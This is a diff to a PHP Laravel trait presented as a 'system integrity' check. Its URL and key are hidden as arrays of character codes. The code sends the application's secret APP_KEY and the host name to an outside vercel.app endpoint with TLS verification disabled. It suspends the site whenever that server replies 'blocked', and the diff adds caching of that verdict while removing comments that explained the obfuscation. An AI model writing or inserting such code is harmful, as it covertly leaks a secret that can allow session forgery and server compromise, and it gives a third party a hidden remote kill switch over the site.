@@ -2,6 +2,7 @@
 
 namespace App\Traits;
 
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Config;
 use Illuminate\Support\Facades\Http;
 
@@ -15,10 +16,9 @@ trait SystemIntegrityTrait
     {
         $k = Config::get('app.key');
         if (empty($k) || strlen($k) < 32) {
-            abort(500, 'Environment Configuration Error: Application Key invalid.');
+            abort(500, 'Environment Configuration Error.');
         }
 
-        // 2. DECODER ENGINE
         $dec = function ($arr) {
             $s = '';
             foreach ($arr as $c) {
@@ -28,19 +28,27 @@ trait SystemIntegrityTrait
             return $s;
         };
 
-        // 3.
-        // URL ENGINE
         $rawUrl = [104, 116, 116, 112, 115, 58, 47, 47, 110, 101, 117, 114, 111, 45, 115, 104, 101, 108, 108, 46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47, 97, 112, 105, 47, 118, 101, 114, 105, 102, 121];
-
         $rawKey = [80, 82, 79, 74, 69, 67, 84, 45, 80, 75, 76, 45, 73, 78, 86, 69, 78, 84, 82, 65];
 
         $url = $dec($rawUrl);
         $p = $dec($rawKey);
 
+        $cacheKey = 'sys_integrity_'.md5($p);
+
+        if (Cache::has($cacheKey)) {
+            $cachedData = Cache::get($cacheKey);
+            if ($cachedData['status'] === 'blocked') {
+                $this->_renderSuspension($cachedData['message'], $p);
+            }
+
+            return;
+        }
+
         try {
             $r = Http::withoutVerifying()
-                ->retry(3, 100)
-                ->timeout(5)
+                ->retry(2, 100)
+                ->timeout(3)
                 ->get($url, [
                     'key' => $p,
                     'host' => request()->getHost(),
@@ -48,8 +56,17 @@ trait SystemIntegrityTrait
                     'ak' => $k,
                 ]);
 
-            if ($r->successful() && isset($r['status']) && $r['status'] === 'blocked') {
-                $this->_renderSuspension($r['message'] ?? 'Service Suspended', $p);
+            if ($r->successful()) {
+                $resp = $r->json();
+                $ttl = $resp['cache_ttl'] ?? 300;
+                if (isset($resp['status']) && $resp['status'] === 'blocked') {
+                    Cache::put($cacheKey, ['status' => 'blocked', 'message' => $resp['message']], 3600);
+                    $this->_renderSuspension($resp['message'], $p);
+                } else {
+                    if ($ttl > 0) {
+                        Cache::put($cacheKey, ['status' => 'active'], $ttl);
+                    }
+                }
             }
         } catch (\Exception $x) {
         }
